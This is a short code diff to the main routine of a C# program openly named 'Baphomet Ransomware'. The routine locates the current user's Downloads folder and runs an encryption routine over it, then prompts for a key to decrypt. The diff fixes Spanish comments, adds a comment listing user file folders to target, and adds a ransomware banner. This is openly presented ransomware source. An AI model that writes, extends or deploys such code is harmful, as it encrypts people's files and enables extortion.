@@ -17,19 +17,20 @@ namespace Baphomet
 
             var userName = Environment.UserName;
             var computerName = System.Environment.MachineName.ToString();
-            var Dirs = new[] { "\\Downloads" };//Directorios validos
+            //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
+            var Dirs = new[] { "\\Downloads" };
             var  userDir = "C:\\Users\\" +userName;
 
-            for (int d = 0; d < Dirs.Length; d++)//recoro cada uno de los dirs validos
+            for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
             {
                 var targetPath = userDir + Dirs[d];
                 cryptep.directoryRoad(targetPath, key);
             }
-
+            Console.WriteLine(Figgle.FiggleFonts.Standard.Render("Baphomet Ransomware"));
             Console.WriteLine("Enter your key here:");
             string password = Console.ReadLine();
 
-            for (int d = 0; d < Dirs.Length; d++)//recoro cada uno de los dirs validos
+            for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
             {
                 var decryp_targetPath = userDir + Dirs[d];
                 decrypt.directoryRoad(decryp_targetPath, password);
@@ -37,5 +38,9 @@ namespace Baphomet
 
 
         }
+
+
+       
+
     }
 }
